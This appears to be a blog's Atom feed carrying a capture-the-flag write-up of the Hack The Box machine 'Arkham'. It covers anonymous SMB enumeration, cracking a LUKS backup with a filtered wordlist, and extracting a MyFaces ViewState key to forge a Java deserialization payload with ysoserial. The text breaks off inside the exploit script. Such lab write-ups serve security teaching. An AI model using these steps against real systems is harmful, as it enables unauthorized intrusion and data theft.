<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-10T04:24:28+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Arkham</title><link href="http://localhost:4000/hack-the-box/arkham/" rel="alternate" type="text/html" title="Hack The Box - Arkham" /><published>2019-08-10T00:00:00+02:00</published><updated>2019-08-10T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/arkham</id><content type="html" xml:base="http://localhost:4000/hack-the-box/arkham/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-arkham-retired-and-heres-my-write-up-about-it-this-box-was-a-challenging-one-and-i-enjoyed-it-a-lot-it-had-an-interesting-java-deserialization-vulnerability-which-is-the-best-thing-about-this-box-despite-the-fact-that-some-parts-were-annoying-this-box-was-great-its-a-windows-box-and-its-ip-is-101010130-i-added-it-to-etchosts-as-arkhamhtb-lets-jump-right-in-&quot;&gt;Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.130&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;arkham.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC arkham.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/arkham/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-http-on-port-80-8080-and-smb-i-checked-smb-first&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, 8080 and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; first.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
&lt;h4 id=&quot;lets-use-smbclient-to-list-the-shares-&quot;&gt;Let’s use &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# smbclient --list //arkham.htb/ -U &quot;&quot;
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        BatShare        Disk      Master Wayne's secrets
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to arkham.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;users-is-an-interesting-share-name-i-checked-it-and-it-had-the-directories-for-guest-and-default-users-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Users&lt;/code&gt; is an interesting share name, I checked it and it had the directories for &lt;code class=&quot;highlighter-rouge&quot;&gt;Guest&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;default&lt;/code&gt; users :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/Users/ -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                  DR        0  Sun Feb  3 15:24:10 2019
  ..                                 DR        0  Sun Feb  3 15:24:10 2019
  Default                           DHR        0  Fri Feb  1 04:49:06 2019
  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
  Guest                               D        0  Sun Feb  3 15:24:19 2019

                5158399 blocks of size 4096. 1899220 blocks available
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-enumerated-it-for-some-time-but-i-couldnt-find-anything-useful-so-i-checked-batshare-which-had-a-zip-archive-called-appserverzip-&quot;&gt;I enumerated it for some time but I couldn’t find anything useful so I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;BatShare&lt;/code&gt; which had a &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; archive called &lt;code class=&quot;highlighter-rouge&quot;&gt;appserver.zip&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/BatShare -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Sun Feb  3 15:00:10 2019
  ..                                  D        0  Sun Feb  3 15:00:10 2019
  appserver.zip                       A  4046695  Fri Feb  1 08:13:37 2019

                5158399 blocks of size 4096. 1897320 blocks available
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-downloaded-it-get-appserverzip-then-i-started-to-examine-it&quot;&gt;I downloaded it (&lt;code class=&quot;highlighter-rouge&quot;&gt;get appserver.zip&lt;/code&gt;) then I started to examine it.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;decrypting-the-backup-image-luks-encrypted-image&quot;&gt;Decrypting the Backup Image (LUKS Encrypted Image)&lt;/h3&gt;
&lt;h4 id=&quot;after-unzipping-appserverzip-i-got-2-files-importanttxt-and-backupimg&quot;&gt;After unzipping &lt;code class=&quot;highlighter-rouge&quot;&gt;appserver.zip&lt;/code&gt; I got 2 files, &lt;code class=&quot;highlighter-rouge&quot;&gt;IMPORTANT.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.img&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# mkdir appserver
root@kali:~/Desktop/HTB/boxes/arkham# cd appserver/
root@kali:~/Desktop/HTB/boxes/arkham/appserver# mv ../appserver.zip .
root@kali:~/Desktop/HTB/boxes/arkham/appserver# unzip appserver.zip 
Archive:  appserver.zip
  inflating: IMPORTANT.txt           
  inflating: backup.img              
root@kali:~/Desktop/HTB/boxes/arkham/appserver# ls -la
total 17276
drwxr-xr-x 2 root root     4096 Aug  9 01:04 .
drwxr-xr-x 3 root root     4096 Aug  9 01:04 ..
-rw-r--r-- 1 root root  4046695 Aug  9 01:03 appserver.zip
-rw-r--r-- 1 root root 13631488 Dec 25  2018 backup.img
-rw-r--r-- 1 root root      149 Dec 25  2018 IMPORTANT.txt
root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;importanttxt-was-a-note-from-bruce-to-alfred-telling-him-that-this-is-the-backup-image-from-their-linux-server-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMPORTANT.txt&lt;/code&gt; was a note from &lt;code class=&quot;highlighter-rouge&quot;&gt;Bruce&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;Alfred&lt;/code&gt; telling him that this is the backup image from their Linux server :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# cat IMPORTANT.txt 
Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce 
root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;backupimg-was-a-luks-encrypted-image-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Backup.img&lt;/code&gt; was a &lt;code class=&quot;highlighter-rouge&quot;&gt;LUKS&lt;/code&gt; encrypted image :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# file backup.img 
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-attempt-to-open-it-with-cryptsetup-but-of-course-we-will-need-a-password-&quot;&gt;We can attempt to open it with &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup&lt;/code&gt; but of course we will need a password :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# cryptsetup open --type luks backup.img test
Enter passphrase for backup.img:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-use-a-tool-called-bruteforce-luks-to-bruteforce-the-password-but-using-it-with-rockyou-would-take-a-very-long-time-the-box-so-far-has-a-lot-of-batman-references-like-the-names-alfred-bruce-joker--and-the-share-name-batshare-also-the-comment-of-that-share--master-waynes-secrets&quot;&gt;We can use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;bruteforce-luks&lt;/code&gt; to bruteforce the password, but using it with &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; would take a very long time. The box so far has a lot of batman references, like the names &lt;code class=&quot;highlighter-rouge&quot;&gt;Alfred&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Bruce&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Joker&lt;/code&gt;  and the share name &lt;code class=&quot;highlighter-rouge&quot;&gt;BatShare&lt;/code&gt;, also the comment of that share : &lt;code class=&quot;highlighter-rouge&quot;&gt;Master Wayne's secrets&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-took-all-the-passwords-from-rockyou-that-had-batman-in-them-and-created-a-custom-list-&quot;&gt;I took all the passwords from &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; that had &lt;code class=&quot;highlighter-rouge&quot;&gt;batman&lt;/code&gt; in them and created a custom list :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# grep batman /usr/share/wordlists/rockyou.txt &amp;gt; list.txt
root@kali:~/Desktop/HTB/boxes/arkham/appserver# bruteforce-luks -f ./list.txt ./backup.img 
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 60
Tried passwords per second: 0.361446
Last tried password: batmanforever

Password found: batmanforever
root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-worked-and-the-password-was-batmanforever&quot;&gt;It worked and the password was &lt;code class=&quot;highlighter-rouge&quot;&gt;batmanforever&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/arkham/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-had-a-directory-called-mask-so-i-copied-it-then-i-unmounted-the-image&quot;&gt;It had a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;Mask&lt;/code&gt; so I copied it then I unmounted the image.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# ls -la
total 18
drwxr-xr-x  4 root root  1024 Dec 25  2018 .
drwxr-x---+ 3 root root  4096 Aug  9 01:30 ..
drwx------  2 root root 12288 Dec 25  2018 lost+found
drwxrwxr-x  4 root root  1024 Dec 25  2018 Mask
root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# cd -                             /root/Desktop/HTB/boxes/arkham/appserver
root@kali:~/Desktop/HTB/boxes/arkham/appserver# cp -r /media/root/af474e94-894e-4bb6-897a-adc82884b3d8/Mask/ .
root@kali:~/Desktop/HTB/boxes/arkham/appserver#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;there-were-some-useless-stuff-that-i-didnt-really-care-about-there-was-a-directory-called-tomcat-stuff-which-had-some-web-server-configuration-files-that-one-was-interesting&quot;&gt;There were some useless stuff that I didn’t really care about, there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;tomcat-stuff&lt;/code&gt; which had some web server configuration files, that one was interesting.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask# ls -la
total 896
drwxr-xr-x 4 root root   4096 Aug  9 01:32 .
drwxr-xr-x 3 root root   4096 Aug  9 01:32 ..
drwxr-xr-x 2 root root   4096 Aug  9 01:32 docs
-rw-r--r-- 1 root root  96978 Aug  9 01:32 joker.png
-rw-r--r-- 1 root root 105374 Aug  9 01:32 me.jpg
-rw-r--r-- 1 root root 687160 Aug  9 01:32 mycar.jpg
-rw-r--r-- 1 root root   7586 Aug  9 01:32 robin.jpeg
drwxr-xr-x 2 root root   4096 Aug  9 01:32 tomcat-stuff
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask# cd tomcat-stuff/
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/tomcat-stuff# ls -la
total 212
drwxr-xr-x 2 root root   4096 Aug  9 01:32 .
drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..
-rw-r--r-- 1 root root   1368 Aug  9 01:32 context.xml
-rw-r--r-- 1 root root    832 Aug  9 01:32 faces-config.xml
-rw-r--r-- 1 root root   1172 Aug  9 01:32 jaspic-providers.xml
-rw-r--r-- 1 root root     39 Aug  9 01:32 MANIFEST.MF
-rw-r--r-- 1 root root   7678 Aug  9 01:32 server.xml
-rw-r--r-- 1 root root   2208 Aug  9 01:32 tomcat-users.xml
-rw-r--r-- 1 root root 174021 Aug  9 01:32 web.xml
-rw-r--r-- 1 root root   3498 Aug  9 01:32 web.xml.bak
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/tomcat-stuff# cd ../docs
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs# ls -la
total 204
drwxr-xr-x 2 root root   4096 Aug  9 01:32 .
drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..
-rw-r--r-- 1 root root 199998 Aug  9 01:32 Batman-Begins.pdf
root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-have-the-server-configuration-files-however-we-havent-checked-any-of-the-http-ports-yet&quot;&gt;We have the server configuration files, However we haven’t checked any of the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; ports yet.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h4&gt;
&lt;h4 id=&quot;port-80-had-nothing-running-there-was-only-the-default-iis-index-page-and-no-subdirectories&quot;&gt;Port 80 had nothing running, there was only the default &lt;code class=&quot;highlighter-rouge&quot;&gt;IIS&lt;/code&gt; index page and no subdirectories.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;on-port-8080-there-was-a-website-with-some-links-&quot;&gt;On port 8080 there was a website with some links :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;one-of-the-links-was-the-subscription-link--httparkhamhtb8080usersubscribefaces&quot;&gt;One of the links was the subscription link : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://arkham.htb:8080/userSubscribe.faces&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tested-it-to-see-what-will-happen-&quot;&gt;I tested it to see what will happen :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/arkham/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nothing-interesting-i-intercepted-the-request-with-burp-and-found-some-interesting-parameters-in-the-post-request-&quot;&gt;Nothing interesting, I intercepted the request with &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; and found some interesting parameters in the POST request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /userSubscribe.faces HTTP/1.1
Host: arkham.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://arkham.htb:8080/userSubscribe.faces
Content-Type: application/x-www-form-urlencoded
Content-Length: 257
Cookie: JSESSIONID=F018FBFC4605B1C80EB54D5CA2A46B91
Connection: close
Upgrade-Insecure-Requests: 1

j_id_jsp_1623871077_1%3Aemail=test&amp;amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;amp;javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;jsf-viewstate-deserialization-vulnerability&quot;&gt;JSF ViewState Deserialization Vulnerability&lt;/h3&gt;
&lt;h4 id=&quot;the-page-had-faces-extension-and-the-post-request-had-a-parameter-called-javaxfacesviewstate&quot;&gt;The page had &lt;code class=&quot;highlighter-rouge&quot;&gt;.faces&lt;/code&gt; extension and the POST request had a parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;javax.faces.ViewState&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;after-some-research-i-knew-that-this-parameter-holds-a-java-serialized-object-this-means-that-there-is-a-potential-deserialization-vulnerability&quot;&gt;After some research I knew that this parameter holds a java serialized object, this means that there is a potential deserialization vulnerability.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;some-resources-if-you-are-unfamiliar-with-deserialization-vulnerabilities-&quot;&gt;Some resources if you are unfamiliar with deserialization vulnerabilities :&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;misconfigured-jsf-viewstates-can-lead-to-severe-rce-vulnerabilities&quot;&gt;&lt;a href=&quot;https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html&quot;&gt;Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities&lt;/a&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;exploiting-blind-java-deserialization-with-burp-and-ysoserial&quot;&gt;&lt;a href=&quot;https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/&quot;&gt;Exploiting blind Java deserialization with Burp and Ysoserial&lt;/a&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;how-i-found-a-1500-worth-deserialization-vulnerability&quot;&gt;&lt;a href=&quot;https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a&quot;&gt;How i found a 1500$ worth Deserialization vulnerability&lt;/a&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;encrypted-java-serialized-rce-this-helped-me-to-know-how-to-encrypt-the-data&quot;&gt;&lt;a href=&quot;https://gist.github.com/cdowns71/76d99ad0829ceef3a83761dbeee3b66d&quot;&gt;Encrypted Java Serialized RCE&lt;/a&gt; (This helped me to know how to encrypt the data)&lt;/h4&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;when-i-tried-to-decode-the-base-64-encoded-value-i-got-nothing-readable&quot;&gt;When I tried to decode the base-64 encoded value I got nothing readable:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-redirected-the-output-into-a-file-and-ran-file-command-against-it-and-i-got-data-instead-of-java-serialization-data&quot;&gt;I redirected the output into a file and ran &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command against it, and I got &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;Java serialization data&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;this-means-that-the-serialized-data-are-encrypted-luckily-we-have-the-server-configuration-files-its-time-to-check-them&quot;&gt;This means that the serialized data are encrypted. Luckily we have the server configuration files, it’s time to check them.&lt;/h4&gt;
&lt;h4 id=&quot;in-webxmlbak-i-found-the-key-used-to-encrypt-the-data-also-the-mac-algorithm-which-was-hmac-sha1-and-the-used-key&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;web.xml.bak&lt;/code&gt; I found the key used to encrypt the data, also the MAC algorithm which was &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac-sha1&lt;/code&gt; and the used key.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ----------------
     Removed Output
    ----------------
&amp;lt;context-param&amp;gt;     

&amp;lt;param-name&amp;gt;org.apache.myfaces.SECRET&amp;lt;/param-name&amp;gt;                                                                     
&amp;lt;param-value&amp;gt;SnNGOTg3Ni0=&amp;lt;/param-value&amp;gt;                                                                                
&amp;lt;/context-param&amp;gt;                                                                                                       
    &amp;lt;context-param&amp;gt;                                                                                                    
        &amp;lt;param-name&amp;gt;org.apache.myfaces.MAC_ALGORITHM&amp;lt;/param-name&amp;gt;                                                      
        &amp;lt;param-value&amp;gt;HmacSHA1&amp;lt;/param-value&amp;gt;                                                                            
     &amp;lt;/context-param&amp;gt;
&amp;lt;context-param&amp;gt;
&amp;lt;param-name&amp;gt;org.apache.myfaces.MAC_SECRET&amp;lt;/param-name&amp;gt;
&amp;lt;param-value&amp;gt;SnNGOTg3Ni0=&amp;lt;/param-value&amp;gt;
&amp;lt;/context-param&amp;gt;
&amp;lt;context-param&amp;gt;
    ----------------
     Removed Output
    ----------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-same-key-was-used--snngotg3ni0-its-base-64-encoded-so-we-need-to-decode-it-&quot;&gt;The same key was used : &lt;code class=&quot;highlighter-rouge&quot;&gt;SnNGOTg3Ni0=&lt;/code&gt;, it’s base-64 encoded so we need to decode it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# echo SnNGOTg3Ni0= | base64 -d
JsF9876-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-key-is-jsf9876-&quot;&gt;The key is &lt;code class=&quot;highlighter-rouge&quot;&gt;JsF9876-&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;we-have-everything-we-need-to-encrypt-the-data-correctly-i-wrote-a-python-script-to-do-it&quot;&gt;We have everything we need to encrypt the data correctly, I wrote a python script to do it.&lt;/h4&gt;
&lt;h4 id=&quot;basically-im-going-to-create-the-payload-with-ysoserial-then-use-my-script-to-encrypt-it&quot;&gt;Basically I’m going to create the payload with &lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt;&lt;/a&gt; then use my script to encrypt it.&lt;/h4&gt;
&lt;h4 id=&quot;viewstatepy-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;viewstate.py&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hmac&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pyDes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;

